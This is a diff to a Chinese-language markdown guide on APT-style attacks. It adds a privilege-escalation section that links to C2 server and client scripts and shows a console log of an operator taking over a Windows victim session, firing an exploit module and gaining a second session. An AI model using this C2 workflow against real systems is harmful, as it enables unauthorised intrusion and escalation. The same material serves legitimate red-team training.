@@ -129,3 +129,37 @@ python3 c2_per.py
 ```bash
 python3 per_client.py
 ```
+
+### 特权提升
+
+[privesc_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/privesc_server.py)
+
+[privesc_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/privesc_client.py)
+
+```bash
+python3 privesc_server.py
+python3 privesc_client.py
+```
+
+```bash
+┌──(crypto)─(root㉿kali)-[~/c2]
+└─# python3 privesc_server.py
+C2 Console running...
+C2> Session 1 connected
+
+C2> sessions
++------------+---------+---------------+-------+
+| Session ID | System  |  IP Address   | User  |
++------------+---------+---------------+-------+
+|     1      | Windows | 192.168.0.170 | apt-i |
++------------+---------+---------------+-------+
+C2> set session 1
+Session 1 selected
+C2> use privesc
+Module privesc loaded
+C2> exploit
+Exploit command sent to session 1
+C2> Session 2 connected
+
+C2> exec whoami /priv
+```
